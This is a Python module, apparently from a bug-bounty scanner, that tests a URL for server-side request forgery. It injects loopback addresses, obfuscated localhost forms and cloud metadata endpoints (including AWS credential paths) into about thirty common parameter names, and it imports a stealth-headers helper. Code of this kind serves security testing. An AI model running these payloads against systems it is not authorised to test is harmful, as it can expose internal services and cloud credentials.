"""
SSRF Scanner — Server-Side Request Forgery detection.
Ref: awesome-bugbounty-tools SSRF category (SSRFmap, Gopherus, etc.)
"""
from urllib.parse import urlparse, urlencode
from .utils import stealth_headers, safe_get, safe_post
import time

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",  # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    "http://2130706433",  # 127.0.0.1 decimal
    "http://0x7f000001",  # 127.0.0.1 hex
    "http://017700000001",  # 127.0.0.1 octal
    "http://127.1",
]

SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "site", "html",
    "val", "data", "load", "file", "page", "domain", "callback",
    "return", "feed", "host", "port", "to", "out", "view",
    "dir", "show", "navigation", "open", "img", "reference",
    "proxy", "request", "fetch",
]

AWS_META_SIGNATURES = [
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "public-hostname", "security-credentials",
]

GCP_META_SIGNATURES = [
    "computeMetadata", "project-id", "instance/zone",
]


def check_ssrf(url):
    """Test for SSRF by injecting internal/cloud metadata URLs into parameters."""
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in SSRF_PARAMS[:10]:
        for payload in SSRF_PAYLOADS[:6]:
            target = f"{base}?{param}={payload}"
            r = safe_get(target, timeout=8)
            if not r:
                continue

            # Check for cloud metadata responses
            if any(sig in r.text for sig in AWS_META_SIGNATURES):
                findings.append({
                    "type": "SSRF_AWS_METADATA",
                    "url": target,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "detail": f"AWS metadata exposed via {param}= parameter"
                })
                return findings

            if any(sig in r.text for sig in GCP_META_SIGNATURES):
                findings.append({
                    "type": "SSRF_GCP_METADATA",
                    "url": target,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "detail": f"GCP metadata exposed via {param}= parameter"
                })
                return findings

            # Check for localhost content indicators
            if "127.0.0.1" in payload or "localhost" in payload:
                # Compare with a known external request to see if response differs
                if r.status_code == 200 and len(r.text) > 50:
                    baseline = safe_get(f"{base}?{param}=https://example.com")
                    if baseline and abs(len(r.text) - len(baseline.text)) > 200:
                        findings.append({
                            "type": "SSRF_INTERNAL_ACCESS",
                            "url": target,
                            "severity": "HIGH",
                            "confidence": "MEDIUM",
                            "detail": f"Internal resource accessible via {param}= (response diff: {abs(len(r.text) - len(baseline.text))} bytes)"
                        })

    return findings if findings else None
